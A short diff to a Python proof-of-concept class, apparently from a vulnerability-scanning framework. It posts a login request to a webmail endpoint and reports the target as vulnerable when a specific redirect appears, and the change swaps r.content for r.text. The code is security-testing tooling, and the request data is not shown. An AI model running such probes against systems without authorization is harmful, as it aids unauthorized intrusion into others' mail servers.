@@ -50,7 +50,7 @@ class Poc(ABPoc):
             verify_url = self.target + '/webmail/fast/index.php?module=operate&action=login'
             r = requests.post(verify_url, data=postdata)
 
-            if r.status_code == 200 and '<meta http-equiv="refresh" content="0; URL=index.php">' in r.content:
+            if r.status_code == 200 and '<meta http-equiv="refresh" content="0; URL=index.php">' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
